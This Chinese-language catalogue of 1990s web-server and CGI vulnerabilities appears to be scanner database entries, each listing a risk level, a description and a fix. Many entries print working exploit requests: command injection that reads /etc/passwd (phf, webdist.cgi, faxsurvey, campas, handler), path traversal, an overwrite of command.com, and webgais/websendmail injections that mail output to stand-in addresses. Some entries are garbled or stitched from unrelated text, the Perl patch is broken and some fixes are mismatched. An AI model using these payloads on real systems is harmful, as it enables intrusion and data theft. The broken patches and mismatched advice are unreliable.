描述：在 NCSA 或者 Apache(1.1.1版本以内)非商业版本的 WebServer 中 
　　　有一段程序 util.c,允许黑客以 root 身份执行任何一个指令: 
      http://www.xxx.com/cgi-bin/phf?Qname=root%0Asome%20command%20here 
建议：无 
解决方法：把 Apache Webserver 升级到 1.1.1 以上，或者将 NCSA Webserver 
　　　　　升级到最新版本 

类型：攻击型 
名字：wguset.exe 
风险等级：中 
描述：如果您使用 NT 做为您的 WebServer 的操作系统，而且 wguest.exe 存 
　　　在于您的 Web 可执行目录中的话，入侵者将能利用它阅读到您的硬 
　　　盘上所有 USR_ 用户能阅读的文件 
建议：将 wguset.exe 从你的 Web 目录移走或删除 
解决方法：将 wguset.exe 从你的 Web 目录移走或删除 

类型：攻击型 
名字：rguset.exe 
风险等级：中 
描述：如果您使用 NT 做为您的 WebServer 的操作系统，而且 rguest.exe 存 
　　　在于您的 Web 可执行目录中的话，入侵者将能利用它阅读到您的硬 
　　　盘上所有 USR_ 用户能阅读的文件 
建议：将 rguset.exe 从你的 Web 目录移走或删除 
解决方法：将 rguset.exe 从你的 Web 目录移走或删除 

类型：攻击型 
名字：perl.exe 
风险等级：低 
描述：在cgi-bin 执行目录下存 在perl.exe,这属于严重的配置错误。黑客 
　　　可以在 perl.exe 后面加一串指令，利用浏览器在 server 上执行任何 
　　　脚本程序 
建议：perl.exe 是放在任何带执行权限的 web 目录下都是不安全的 
解决方法：在 web 目录下移除 perl.exe 这个程序. 

类型：攻击型 
名字：shtml.exe 
风险等级：低 
描述：如果您使用 FrontPage 作为您的 WebServer，那么入侵者能够利用 
　　　IUSR_ 用户和 shtml.exe 入侵您的机器，做您不希望的事 
建议：将 shtml.exe 从你的 Web 目录移走或删除 
解决方法：将 shtml.exe 从你的 Web 目录移走或删除 

类型：攻击型 
名字：wwwboard.pl 
风险等级：低 
描述：wwwboard.pl 程序容易引起攻击者对服务器进行 D.O.S 攻击 
建议：如无必要可以删除该文件 
解决方法：对 get_variables 的子程序中的下面这段: 
if($FORM{\'followup\'}){$followup=\"1\"; 
@followup_num=split(/,/,$FORM{\'followup\'}); 
$num_followups=@followups=@followup_num;
$last_message=pop(@followups);
$origdate=\"$FORM{\'origdate\'}\"; 
$origname=\"$FORM{\'origname\'}\"; 
$origsubject=\"$FORM{\'origsubject\'}\";} 

替换为: 

if($FORM{\'followup\'}){ 
$followup=\"1\"; 
@followup_num=split(/,/,$FORM{\'followup\'}); 
$num_followups=@followups=@followup_num; 
$last_message=pop(@followups); 
$origdate=\"$FORM{\'origdate\'}\"; 
$origname=\"$FORM{\'origname\'}\"; 
$origsubject=\"$FORM{\'origsubject\'}\"; 
#WWWBoardBombPatch 
#WrittenBy:SamuelSparlingsparling@slip.net) 
$fn=0; 
while($fn<$num_followups) 
{ 
$cur_fup=@followups$fn]; 
$dfn=0; 
foreach$fm(@followups) 
{ 
if(@followups[$dfn]==@followups[$fn]&&$dfn!=$fn) 
{ 
&error(board_bomb); 
} 
$dfn++; 
} 
$fn++; 
} 
#EndWWWBoardBombPatch 
} 

类型：攻击型 
名字：uploader.exe 
风险等级：中 
描述：如果您使用NT作为您的WebServer的操作系统,入侵者能够利用 
　　　uploader.exe上传任何文件 
建议：将uploader.exe从你的Web目录移走或删除 
解决方法：将uploader.exe从你的Web目录移走或删除 

类型：攻击型 
名字：bdir.htr 
风险等级：高 
描述：如果您使用NT做为您的WebServer的操作系统，而且bdir.htr存在 
　　　于您的Web可执行目录中的话，入侵者将能利用它在您的服务器上 
　　　无止境的创建ODBC数据库，并生成一些可执行的文件。 
建议：将bdir.htr从你的Web目录移走或删除 
解决方法：将bdir.htr从你的Web目录移走或删除 

类型：攻击型 
名字：Count.cgi 
风险等级：高 
描述：在/cgi-bin目录下的Count.cgi程序(wwwcount2.3版本)有一个溢出 
　　　错误,允许入侵者无须登录而远程执行任何指令。 
建议：如无必要可以删除该文件 
解决方法：将wwwcount升级到2.4或者以上 

类型：攻击型 
名字：test-cgi 
风险等级：高 
描述：test-cgi这个文件可以被入侵者用来浏览服务器上的重要信息 
建议：建议审核cgi-bin目录下的执行程序，严格控制访问权限 
解决方法：删除test-cgi文件 

类型：攻击型 
名字：nph-test-cgi 
风险等级：高 
描述：nph-test-cgi这个文件可以被入侵者用来浏览服务器上的重要信息 
建议：建议审核cgi-bin目录下的执行程序，严格控制访问权限 
解决方法：删除nph-test-cgi文件 

类型：攻击型 
名字：php.cgi 
风险等级：低 
描述：php.cgi程序有较多的漏洞，包括缓存溢出漏洞，还有导致任何系 
　　　统文件可以被入侵者读取的漏洞 
建议：建议审核cgi-bin目录，避免有不必要的程序存在 
解决方法：删除php.cgi程序是最好的办法 

类型：攻击型 
名字：handler 
风险等级：低 
描述：IRIX5.3,6.2,6.3,6.4的/cgi-bin/handler程序存在缓存溢出 
　　　错误，允许入侵者在server上远程执行一段程序: 
　　　telnettarget.machine.com80 
　　　GET/cgi-bin/handler/whatever;cat/etc/passwd|?data=Download 
　　　HTTP/1.0 
建议：建议审核cgi-bin目录，避免有不必要的程序存在 
解决方法：删除handler文件 

类型：攻击型 
名字：webgais 
风险等级：高 
描述：/cgi-bin，目录下的webgais是GAIS搜索工具的一个接口,它有一个 
　　　毛病使入侵者可以绕过程序的安全机制，执行系统命令: 
　　　POST/cgi-bin/webgaisHTTP/1.0 
　　　Content-length:85(replacethiswiththeactuallengthof 
　　　the\"exploit\"line) 
　　　telnettarget.machine.com80query=\';mail+you\\@your.host 
建议：建议审核cgi-bin目录，避免有不必要的程序存在 
解决方法：删除webgais文件 

类型：攻击型 
名字：websendmail 
风险等级：高 
描述：/cgin-bin目录下的websendmail程序允许入侵者执行一个系统指令: 
　　　telnettarget.machine.com80 
　　　POST/cgi-bin/websendmailHTTP/1.0 
　　　Content-length:xxx(shouldbereplacedwiththeactual 
　　　lengthofthestringpassedtotheserver,inthiscase 
　　　xxx=90)　receiver=;mail+your_address\\@somewhere.org 
　　　&content=a 
建议：建议审核cgi-bin目录，避免有不必要的程序存在 
解决方法：高级用户:编辑websendmail脚本,过滤特殊字符 
一般用户：删除websendmail文件 

类型：攻击型 
名字：webdist.cgi 
风险等级：高 
描述：对于Irix6.2和6.3平台,/cgi-bin目录下的webdist.cgi有一个弱点 
　　　允许入侵者无须登录而在系统上执行任何指令: 
　　　http://host/cgi-bin/webdist.cgi?distloc=;cat%20/etc/passwd 
建议：建议审核cgi-bin目录，避免有不必要的程序存在 
解决方法：删除/var/www/cgi-bin/webdist.cgi目录下的webdist.cgi 

类型：攻击型 
名字：faxsurvey 
风险等级：高 
描述：在LinuxS.u.S.E上/cgi-bin目录下的faxsurvey程序允许入侵者无 
　　　须登录就能在服务器执行指令:http://joepc.linux.elsewhere.org/ 
　　　cgi-bin/faxsurvey?/bin/cat%20/etc/passwd 
建议：建议审核cgi-bin目录，避免有不必要的程序存在 
解决方法：删除/cgi-bin/faxsurvey文件 

类型：攻击型 
名字：htmlscript 
风险等级：中 
描述：安装了htmlscript2.99x或者更早版本的服务器，存在一个毛病使 
　　　入侵者可以查看服务器上的任何文件： 
　　　http://www.vulnerable.server.com/cgi-bin/htmlscript?../../ 
　　　../../etc/passwd 
建议：建议审核cgi-bin目录，避免有不必要的程序存在 
解决方法：删除/cgi-bin/htmlscript脚本文件,或者将htmlscript升级到 
　　　　　3.0以上 

类型：攻击型 
名字：pfdisplay 
风险等级：中 
描述：在Irix6.4或者更早版本的web服务器上，/cgi-bin/pfdisplay程序 
　　　允许入侵者非法查看服务器上的文件 
建议：建议审核cgi-bin目录，避免有不必要的程序存在 
解决方法：删除/cgi-bin/pfdisplay文件,或者打补丁，补丁可以去 
　　　　　sgigate.sgi.com(204.94.209.1)或者ftp.sgi.com下载: 
　　　　　Filename:README.patch.3018 
　　　　　Algorithm#1(sum-r):3795511README.patch.3018 
　　　　　Algorithm#2(sum):1545511README.patch.3018 
　　　　　MD5checksum:1169EB51D75E0794C64C2C1FD6211B69 
　　　　　Filename:patchSG0003018 
　　　　　Algorithm#1(sum-r):016792patchSG0003018 
　　　　　Algorithm#2(sum):128762patchSG0003018 
　　　　　MD5checksum:BD16A53A0AE693D6E9E276EE066BDBC8 
　　　　　Filename:patchSG0003018.idb 
　　　　　Algorithm#1(sum-r):013392patchSG0003018.idb 
　　　　　Algorithm#2(sum):2512patchSG0003018.idb 
　　　　　MD5checksum:1CB16E6A8C50BF17CD02A29C2E4D35EB 
　　　　　Filename:patchSG0003018.performer_tools_man 
　　　　　Algorithm#1(sum-r):102018patchSG0003018.per- 
　　　　　-former_tools_man 
　　　　　Algorithm#2(sum):31448patchSG0003018.performer_t- 
　　　　　-ools_man 
　　　　　MD5checksum:B6B3D90FAB9B5A342397C3E5AF5A8D29 
　　　　　Filename:patchSG0003018.performer_tools_sw 
　　　　　Algorithm#1(sum-r):4847418patchSG0003018.perform- 
　　　　　-er_tools_sw 
　　　　　Algorithm#2(sum):2817618patchSG0003018.performer_ 
　　　　　tools_sw 
　　　　　MD5checksum:DF4E8ED8326A6A0B39F7B4D67E5FD71F 

类型：攻击型 
名字：www-sql 
风险等级：中 
描述：www-sql存在于/cgi-bin/目录下，这将导致入侵可以越权访问被保 
　　　护的文件 
建议：最好删除www-sql文件 
解决方法：#ifPHPFASTCGI 
　　　　　while(FCGI_Accept()>=0) 
　　　　　{ 
　　　　　#endif 
　　　　　s=getenv(\"REDIRECT_STATUS\"); 
　　　　　if(!s){ 
　　　　　puts(\"Content-type:text/plain\\r\\n\\r\\nPHP/FIdetected 
　　　　　aninternalerror.Pleaseinformsa@hogia.netofwhat 
　　　　　youjustdid.\\n\"); 
　　　　　exit(1); 
　　　　　} 
　　　　　s=getenv(\"PATH_TRANSLATED\"); 

类型：攻击型 
名字：view-source 
风险等级：高 
描述：在cgi-bin目录下的view-source程序没有对输入进行安全检查，使 
　　　入侵者可以查看服务器上的任何文件 
建议：建议审核cgi-bin目录，避免有不必要的程序存在 
解决方法：删除/cgi-bin目录下的viewsource程序 

类型：攻击型 
名字：campas 
风险等级：高 
描述：在cgi-bin目录下的campas程序有一个毛病可以使入侵者随意查看 
　　　server上的重要文件: 
　　　telnetwww.xxxx.net80 
　　　Trying200.xx.xx.xx... 
　　　Connectedtovenus.xxxx.net 
　　　Escapecharacteris\'^]\'. 
　　　GET/cgi-bin/campas?%0acat%0a/etc/passwd%0a 
建议：建议审核cgi-bin目录，避免有不必要的程序存在 
解决方法：删除/cgi-bin目录下的campas程序 

类型：攻击型 
名字：aglimpse 
风险等级：高 
描述：在cgi-bin目录下的aglimpse程序有一个毛病可以使入侵者无须登 
　　　录而随意执行任何指令　 
建议：建议审核cgi-bin目录，避免有不必要的程序存在 
解决方法：删除/cgi-bin目录下的aglimpse程序 

类型：攻击型 
名字：AT-admin.cgi 
风险等级：中 
描述：在ExciteforWebServers1.1上的/cgi-bin/AT-admin.cgi程序，允 
　　　许普通用户完全控制整个系统 
建议：建议审核cgi-bin目录，避免有不必要的程序存在 
解决方法：删除/cgi-bin目录下的AT-admin.cgi程序 

类型：攻击型 
名字：finger 
风险等级：中 
描述：这个位于/cgi-bin下的finger程序，可以查看其它服务器的信息， 
　　　但是如果将参数改成本机，本机上的帐号信息将暴露无遗: 
　　　/cgi-bin/finger?@localhost 
建议：建议审核cgi-bin目录，避免有不必要的程序存在 
解决方法：删除/cgi-bin目录下的finger程序 

类型：攻击型 
名字：webwho.pl 
风险等级：中 
描述：如果在您的Web可执行目录中有webwho.pl这个CGI脚本，那么入侵 
　　　者将能利用他阅读启动Web的用户能读写执行的任何文件。 
建议：将webwho.pl从您的Web目录中删除或移走 
解决方法：将webwho.pl从您的Web目录中删除或移走 

类型：攻击型 
名字：w3-msql 
风险等级：低 
描述：MiniSQL 软件包发行版本附带的一个 CGI（w3-msql）可被用于以 
　　　httpd 的 uid 权限执行任意代码。这个安全漏洞是由程序中的 
scanf() 函数引起的。 
建议：如果您安装了 MiniSQL 软件包,请您将 /cgi-bin/ 目录下的 w3-msql
文件删除或移走
解决方法：如果您安装了MiniSQL软件包,请您将/cgi-bin/目录下的w3-msql 
　　　　　文件删除或移走，或使用以下补丁。 

补丁： 
------w3-msql.patch--------- 

410c410 
scanf(\"%s\",boundary); <br>--- 
<scanf(\"%128s\",boundary);>
418c418 
<strcat(var,buffer);
<strncat(var,buffer,sizeof(buffer)); 
428c428 
<scanf(\"Content-Type:%s\",buffer);>
<scanf(\"Content-Type:%15360s\",buffer);> 

------w3-msql.patch--------- 

类型：攻击型 
名字：NetscapeFastTrackserver2.0.1a 
风险等级：中 
描述：UnixWare7.1附带的NetscapeFastTrackserver2.0.1a存在一个远程 
　　　缓冲区溢出漏洞。缺省地，监听457端口的httpd通过http协议提供 
　　　UnixWare文档。如果向该服务器传送一个长度超过367字符的GET请 
　　　求，会使缓冲区溢出，EIP值被覆盖将可能导致任意代码以httpd权 
　　　限执行。 
建议：临时解决方法是关闭NetscapeFastTrack服务器 
解决方法：临时解决方法是关闭NetscapeFastTrack服务器。 

类型：攻击型 
名字：AnyForm.cgi 
风险等级：高 
描述：位于cgi-bin目录下的AnyForm.cgi程序，是用于简单表单通过邮件 
　　　传递响应的,但该程序对用户输入检查不彻底，可被入侵者利用， 
　　　在server上执行任何指令. 
建议：建议审核cgi-bin目录，避免有不必要的程序存在 
解决方法：建议升级该cgi程序,或者删除该文件 

类型：攻击型 
名字：whois.cgi 
风险等级：低 
描述：在多个WebServer中带有的Whois.cgi存在溢出漏洞。它们包括： 
WhoisInternicLookup-version:1.02 
CCWhois-Version:1.0 
Matt\'sWhois-Version:1 
　　他们将使入侵者能够在您的系统上使用启动httpd用户的权限执行任 
意的代码 
建议：将在您Web目录中问whois.cgi删除或移走 
解决方法：将在您Web目录中问whois.cgi删除或移走 

类型：攻击型 
名字：environ.cgi 
风险等级：中 
描述：在Apachewebserver或者IIS等其它webserver的/cgi-bin/environ.cgi 
　　　程序,有一个毛病允许入侵者绕过安全机制，浏览服务器上的一些 
　　　文件。 
建议：建议审核cgi-bin目录，避免有不必要的程序存在 
解决方法：建议升级该cgi程序,或者删除该文件 

类型：攻击型 
名字：wrap 
风险等级：中 
描述：/cgi-bin/wrap程序有两个漏洞，均允许入侵者获取服务器上文件 
　　　的非法访问,如: 
　　　http://host/cgi-bin/wrap?/../../../../../etc 
建议：建议审核cgi-bin目录，避免有不必要的程序存在 
解决方法：删除/cgi-bin/wrap文件 

类型：攻击型 
名字：edit.pl 
风险等级：中 
描述：/cgi-bin/edit.pl有一个安全弱点,用下面这条命令就可以访问用 
　　　户的配置情况: 
　http://www.sitetracker.com/cgi-bin/edit.pl?account=&password= 
建议：建议审核cgi-bin目录，避免有不必要的程序存在 
解决方法：删除/cgi-bin/edit.pl文件 

类型：攻击型 
名字：service.pwd 
风险等级：中 
描述：UNix系统的http://www.hostname.com/_vti_pvt/service.pwd可读， 
　　　将暴露用户密码信息 
建议：建议删除 
解决方法：chownrootservice.pwd　chmod700service.pwd 

类型：攻击型 
名字：administrators.pwd 
风险等级：中 
描述：UNix系统的http://www.hostname.com/_vti_pvt/administrators.pwd 
　　　可读,将暴露用户密码信息 
建议：建议删除 
解决方法：chownrootadministrators.pwd　chmod700administrators.pwd 
相关连接：　 

类型：攻击型 
名字：users.pwd 
风险等级：中 
描述：UNix系统的http://www.hostname.com/_vti_pvt/users.pwd可读， 
　　　将暴露用户密码信息 
建议：建议删除 
解决方法：chownrootusers.pwd　chmod700users.pwd 

类型：攻击型 
名字：authors.pwd 
风险等级：中 
描述：UNix系统的http://www.hostname.com/_vti_pvt/authors.pwd可读， 
　　　将暴露用户密码信息 
建议：建议删除 
解决方法：chownrootauthors.pwd　chmod700authors.pwd 

类型：攻击型 
名字：visadmin.exe 
风险等级：中 
描述：在OmniHTTPdWebServer的cgi-bin目录下存在这个文件visadmin.exe， 
　　　那么攻击者只要输入下面的命令: 
　　　http://omni.server/cgi-bin/visadmin.exe?user=guest数分钟之 
　　　后服务器的硬盘将会被撑满 
建议：建议删除 
解决方法：把visadmin.exe从cgi-bin目录中删除 

类型：攻击型 
名字：get32.exe 
风险等级：高 
描述：Alibaba的webserver,其cgi-bin目录存在get32.exe这个程序，允 
　　　许入侵者任意执行一条指令: 
http://www.victim.com/cgi-bin/get32.exe|echo%20>c:\\command.com 
建议：建议删除 
解决方法：把GET32.exe从cgi-bin目录中删除 

类型：攻击型 
名字：alibaba.pl 
风险等级：高 
描述：Alibaba的webserver,其cgi-bin目录存在alibaba.pl这个程序，允 
　　　许入侵者任意执行一条指令: 
　　　http://www.victim.com/cgi-bin/alibaba.pl|dir 
建议：建议删除 
解决方法：把alibaba.pl从cgi-bin目录中删除 

类型：攻击型 
名字：tst.bat 
风险等级：高 
描述：Alibaba的webserver,其cgi-bin目录存在tst.bat这个程序，允许 
　　　入侵者任意执行一条指令: 
http://www.victim.com/cgi-bin/tst.bat|type%20c:\\windows\\win.ini 
建议：建议删除 
解决方法：把tst.bat从cgi-bin目录中删除 

类型：攻击型 
名字：fpcount.exe 
风险等级：低 
描述：如果您使用NT作为您的WebServer的操作平台，并只安装了SP3补丁， 
　　　那么入侵者能利用这个CGI程序进行DoS攻击，使您的IIS服务拒绝 
　　　访问。 
建议：将在您Web目录中的fpcount.exe删除或移走 
解决方法：将在您Web目录中的fpcount.exe删除或移走 

类型：攻击型 
名字：openfile.cfm 
风险等级：低 
描述：如果在您的Web目录中含有 
　　　/cfdocs/expeval/exprcalc.cfm 
　　　/cfdocs/expeval/sendmail.cfm 
　　　/cfdocs/expeval/eval.cfm 
　　　/cfdocs/expeval/openfile.cfm 
　　　/cfdocs/expeval/displayopenedfile.cfm 
　　　/cfdocs/exampleapp/email/getfile.cfm 
　　　/cfdocs/exampleapp/publish/admin/addcontent.cfm 
　　这些文件，那么入侵者可能能够利用它们读到您系统上的所有文件 
建议：将在您Web目录中的openfile.cfm删除或移走 
解决方法：将在您Web目录中的openfile.cfm删除或移走 

类型：攻击型 
名字：exprcalc.cfm 
风险等级：低 
描述：如果在您的Web目录中含有 
　　　/cfdocs/expeval/exprcalc.cfm 
　　　/cfdocs/expeval/sendmail.cfm 
　　　/cfdocs/expeval/eval.cfm 
　　　/cfdocs/expeval/openfile.cfm 
　　　/cfdocs/expeval/displayopenedfile.cfm 
　　　/cfdocs/exampleapp/email/getfile.cfm 
　　　/cfdocs/exampleapp/publish/admin/addcontent.cfm 
　　这些文件，那么入侵者可能能够利用它们读到您系统上的所有文件 
建议：将在您Web目录中的exprcalc.cfm删除或移走 
解决方法：将在您Web目录中的exprcalc.cfm删除或移走 
相关连接：http://www.allaire.com/handlers/index.cfm?ID=8727&Method=Full 

类型：攻击型 
名字：displayopenedfile.cfm 
风险等级：低 
描述：如果在您的Web目录中含有 
　　　/cfdocs/expeval/exprcalc.cfm 
　　　/cfdocs/expeval/sendmail.cfm 
　　　/cfdocs/expeval/eval.cfm 
　　　/cfdocs/expeval/openfile.cfm 
　　　/cfdocs/expeval/displayopenedfile.cfm 
　　　/cfdocs/exampleapp/email/getfile.cfm 
　　　/cfdocs/exampleapp/publish/admin/addcontent.cfm 
　　这些文件，那么入侵者可能能够利用它们读到您系统上的所有文件 
建议：将在您Web目录中的displayopenedfile.cfm删除或移走 
解决方法：将在您Web目录中的displayopenedfile.cfm删除或移走 

类型：攻击型 
名字：sendmail.cfm 
风险等级：中 
描述：将在您Web目录中的openfile.cfm删除或移走 
　　　在多个WebServer中带有的Whois.cgi存在溢出漏洞。它们包括： 
　　　WhoisInternicLookup-version:1.02 
　　　CCWhois-Version:1.0 
　　　Matt\'sWhois-Version:1 
　　　他们将使入侵者 
　　　能够在您的系统上使用启动httpd用户的权限执行任意的代码 
　　　如果在您的Web目录中含有 
　　　/cfdocs/expeval/exprcalc.cfm 
　　　/cfdocs/expeval/sendmail.cfm 
　　　/cfdocs/expeval/eval.cfm 
　　　/cfdocs/expeval/openfile.cfm 
　　　/cfdocs/expeval/displayopenedfile.cfm 
　　　/cfdocs/exampleapp/email/getfile.cfm 
　　　/cfdocs/exampleapp/publish/admin/addcontent.cfm 
　　这些文件，那么入侵者可能能够利用它们读到您系统上的所有文件 
建议：将在您Web目录中的sendmail.cfm删除或移走 
解决方法：将在您Web目录中的sendmail.cfm删除或移走 

类型：攻击型 
名字：codebrws.asp 
风险等级：中 
描述：如果您使用NT+IIS作为您的WebServer的情况下，入侵者能够利用 
　　　这个ASP查看您系统上所有启动httpd用户有权限阅读的文件请前往 
　　　以下地址查询补丁InternetInformationServer: 
　　　ftp://ftp.microsoft.com/bussys/iis/iis-public/fixes/usa/ 
　　　Viewcode-fix/ 
　　　SiteServer: 
　　　ftp://ftp.microsoft.com/bussys/sitesrv/sitesrv-public/fixes/ 
　　　usa/siteserver3/hotfixes-postsp2/Viewcode-fix/ 
　　　http://www.microsoft.com/security/products/iis/checklist.asp 
建议：将在您Web目录中的codebrws.asp删除或移走 
解决方法：将在您Web目录中的codebrws.asp删除或移走 

类型：信息型 
名字：codebrws.asp_1 
风险等级：中 
描述：在/iissamples/exair/howitworks/下面存在codebrws.asp文件， 
　　　用下面的路径： 
　　　http://www.xxx.com/iissamples/exair/howitworks/codebrws.asp? 
　　　source=/index.asp就可以查看到index.asp的源码。实际上任何 
　　　ascii文件都可以浏览。 
建议：删除名叫/iissamples/的web目录 
解决方法：将在您Web目录中的codebrws.asp删除或移走 
请前往以下地址查询补丁 
InternetInformationServer: 
ftp://ftp.microsoft.com/bussys/i ... s/usa/Viewcode-fix/ 
SiteServer: 
ftp://ftp.microsoft.com/bussys/sitesrv/sitesrv-public/fixes/usa/ 
siteserver3/hotfixes-postsp2/Viewcode-fix/ 
http://www.microsoft.com/security/products/iis/checklist.asp 
相关连接：ftp://ftp.microsoft.com/bussys/iis/iis-public/fixes/ 
usa/Viewcode-fix/ 

类型：攻击型 
名字：showcode.asp_1 
风险等级：中 
描述：在/msads/Samples/SELECTOR/目录下存在showcode.asp文件,用下 
　　　面的路径: 
http://www.xxx.com/msadc/Samples/SELECTOR/showcode.asp?source=/ 
msadc/Samples/../../../../../boot.ini 

　　可以查到boot.ini文件的内容;实际上入侵者能够利用这个ASP查看您 
系统上所有启动httpd用户有权限阅读的文件 

建议：禁止对/msads目录的匿名访问 
解决方法：将在您Web目录中的showcode.asp删除或移走 
请前往以下地址查询补丁 
InternetInformationServer: 
ftp://ftp.microsoft.com/bussys/iis/iis-public/fixes/usa/ 
Viewcode-fix/ 
SiteServer: 
ftp://ftp.microsoft.com/bussys/sitesrv/sitesrv-public/fixes/usa/ 
siteserver3/hotfixes-postsp2/Viewcode-fix/ 
http://www.microsoft.com/security/products/iis/checklist.asp 
相关连接：ftp://ftp.microsoft.com/bussys/iis/iis-public/fixes/ 
usa/Viewcode-fix/ 

类型：攻击型 
名字：/msadc目录可以访问 
风险等级：中 
描述：WindowsNTIISserver下的/msadc目录可以访问，会造成一系列安全 
　　　问题，包括被入侵者非法调用应用程序 
建议：建议删除不必要的由IIS缺省安装形成的目录 
解决方法：禁止/msadc目录，如果必须打开该目录，至少应该设置成合法 
　　　　　用户需要密码才能访问 

类型：攻击型 
名字：search97.vts 
风险等级：中 
描述：这个文件将能使入侵者任意的读取你系统中启动httpd用户能读取 
　　　的文件 
建议：将在您Web目录中的search97.vts删除或移走 
解决方法：将在您Web目录中的search97.vts删除或移走,或前往以下地址 
　　　　　下载Patch 
　　　　　https://customers.verity.com/products/server/310/ 
　　　　　patches/ 

类型：攻击型 
名字：carbo.dll 
风险等级：低 
描述：如果您安装了SystemsrunningiCatSuiteversion3.0，那么它将自 
　　　动在你的系统上添加一个叫carbo.dll的文件，而入侵者将能利用 
　　　这个文件访问您系统上的热和文件 
建议：将在您Web目录中的openfile.cfm删除或移走 
解决方法：将在您Web目录中的openfile.cfm删除或移走 

类型：攻击型 
名字：whois_raw.cgi 
风险等级：低 
描述：因为whois_raw.cgi作者的失误，这个CGI将使入侵者能够以您系统 
　　　上启动httpd的用户的权限执行您系统上任意的程序 
建议：将在您Web目录中的whois_raw.cgi删除或移走 
解决方法：将在您Web目录中的whois_raw.cgi删除或移走 

类型：攻击型 
名字：doc 
风险等级：低 
描述：您的Web目录可以文件列表，这将帮助入侵者分析您的系统信息 
建议：将您的所有Web目录设置为不能文件列表 
解决方法：将您的所有Web目录设置为不能文件列表 

类型：攻击型 
名字：.html/............./config.sys 
风险等级：低 
描述：如果您使用的是较久版本的ICQ，那么入侵者能够利用它阅读您机 
　　　器上的所有文件 
建议：下载新版本的ICQ 
解决方法：请前往以下地址下载新版本的ICQ 

类型：攻击型 
名字：....../ 
风险等级：中 
描述：您使用的WebServer软件能使入侵者阅读您系统上的所有文件 
建议：更换或升级您的WebServer软件 
解决方法：更换或升级您的WebServer软件 

类型：攻击型 
名字：no-such-file.pl 
风险等级：低 
描述：由于您的WebServer软件的缺陷，使得入侵者能够利用不存在的CGI 
　　　脚本请求来分析您的站点的目录结构 
建议：升级您的WebServer软件 
解决方法：升级您的WebServer软件 

类型：攻击型 
名字：_vti_bin/shtml.dll 
风险等级：低 
描述：入侵者利用这个文件将能使您的系统的CPU占用率达到100% 
建议：将_vti_bin/shtml.dll从您的Web目录删除或移走 
解决方法：将_vti_bin/shtml.dll从您的Web目录删除或移走 

类型：信息型 
名字：nph-publish 
风险等级：中 
描述：在/cgi-bin目录下存在nph-publish文件，这使入侵者能通过www浏 
　　　览服务器上的任何文件 
建议：建议审查/cgi-bin目录，删除不必要的cgi程序 
解决方法：删除nph-publish文件 

类型：信息型 
名字：showcode.asp 
风险等级：中 
描述：在/msadc/Samples/SELECTOR/showcode.asp?source=/msadc/Sampl 
　　　es/SELECTOR/目录下存在showcode.asp文件可以被入侵者利用来查 
　　　看服务器上的文件内容 
建议：最好禁止/msadc这个web目录的匿名访问，建议删除这个web目录 
解决方法：删除showcode.asp文件 

类型：信息型 
名字：_vti_inf.html 
风险等级：中 
描述：web根目录下存在_vti_inf.html文件,该文件是Frontpageexten- 
　　　-tionserver的特征,包含了一系列FrontpageExtentionServer的重 
　　　要信息；而且FrontpageExtentionserver是一个有很多漏洞的web 
　　　服务，用它入侵者可能直接修改首页文件。 
建议：用ftp等其它方式上载网页文件 
解决方法：卸载FrontpageExtentionServer 

类型：信息型 
名字：index.asp::$DATA 
风险等级：中 
描述：asp程序的源代码可以被后缀+::$DATA的方法查看到,这样入侵者可 
　　　以设法查到服务器数据库密码等重要信息 
建议：建议留意微软最新关于codeview的补丁和安全公告 
解决方法：安装servicespack6或者打补丁: 
ftp://ftp.microsoft.com/bussys/iis/iis-public/fixes/chs/security/ 
fesrc-fix/ 
相关连接：ftp://ftp.microsoft.com/bussys/iis/iis-public/fixes/ 
chs/security/fesrc-fix/ 

类型：攻击型 
名字：main.asp%81 
风险等级：低 
描述：asp程序的源代码可以被后缀+%81的方法查看到,这样入侵者可以设 
　　　法查到服务器数据库密码等重要信息 
建议：建议留意微软最新关于codeview的补丁和安全公告 
解决方法：安装servicespack6或者打补丁: 
ftp://ftp.microsoft.com/bussys/iis/iis-public/fixes/chs/security 
/fesrc-fix/ 
相关连接：ftp://ftp.microsoft.com/bussys/iis/iis-public/fixes/ 
chs/security/fesrc-fix/ 

类型：信息型 
名字：showcode.asp_2 
风险等级：中 
描述：在/msadc/Samples/SELECTOR/目录下存在showcode.asp文件,用下 
　　　面的路径:http://www.xxx.com/msadc/Samples/SELECTOR/showcode. 
　　　asp?source=/msadc/Samples/../../../../../boot.ini可以查到 
　　　boot.ini文件的内容;实际上入侵者能够利用这个ASP查看您系统上 
　　　所有启动httpd用户有权限阅读的文件 
建议：禁止对/msadc目录的匿名访问 
解决方法：将在您Web目录中的showcode.asp删除或移走 
请前往以下地址查询补丁 
InternetInformationServer:ftp://ftp.microsoft.com/bussys/iis/iis 
-public/fixes/usa/Viewcode-fix/ 
SiteServer: 
ftp://ftp.microsoft.com/bussys/sitesrv/sitesrv-public/fixes/usa/ 
siteserver3/hotfixes-postsp2/Viewcode-fix/ 
http://www.microsoft.com/security/products/iis/checklist.asp 
相关连接：ftp://ftp.microsoft.com/bussys/iis/iis-public/fixes/ 
usa/Viewcode-fix/ 

类型：攻击型 
名字：ism.dll 
风险等级：高 
描述：在/scripts/iisadmin/目录下存在ism.dll文件,这个文件有一个溢 
　　　出错误，允许入侵者在服务器上执行任意一段程序;另外。攻击者 
　　　还随时可以令服务器的www服务死掉 
建议：禁止对/scripts目录的匿名访问 
解决方法：删除/scripts/iisadmin/ism.dll,或者打开iis的管理控制台， 
　　　　　选取默认web站点，点右键，选取属性，点:\"主目录\",在起始 
　　　　　点那行点\"配置\"按钮,将\".htr\"的应用程序映射项删除 

类型：信息型 
名字：codebrws.asp_2 
风险等级：中 
描述：在/iissamples/sdk/asp/docs/下面存在codebrws.asp文件,用下面 
　　　的路径:http://www.xxx.com/iissamples/exair/howitworks/code 
　　　brws.asp?source=/index.asp就可以查看到index.asp的源码。实 
　　　际上任何ascii文件都可以浏览。 
建议：删除名叫/iissamples/的web目录 
解决方法：将在您Web目录中的codebrws.asp删除或移走 
请前往以下地址查询补丁 
InternetInformationServer: 
ftp://ftp.microsoft.com/bussys/i ... s/usa/Viewcode-fix/ 
SiteServer: 
ftp://ftp.microsoft.com/bussys/sitesrv/sitesrv-public/fixes/usa/ 
siteserver3/hotfixes-postsp2/Viewcode-fix/ 
http://www.microsoft.com/security/products/iis/checklist.asp 
相关连接：ftp://ftp.microsoft.com/bussys/iis/iis-public/fixes/ 
usa/Viewcode-fix/ 

类型：攻击型 
名字：uploadn.asp 
风险等级：高 
描述：在/scripts/tools目录下存在uploadn.asp程序,只要入侵者有一个 
　　　可用帐号，哪怕是Guest帐号，就可以上传任何文件到你的web目录， 
　　　除了替换主页外，他更可以进一步控制你的整个系统! 
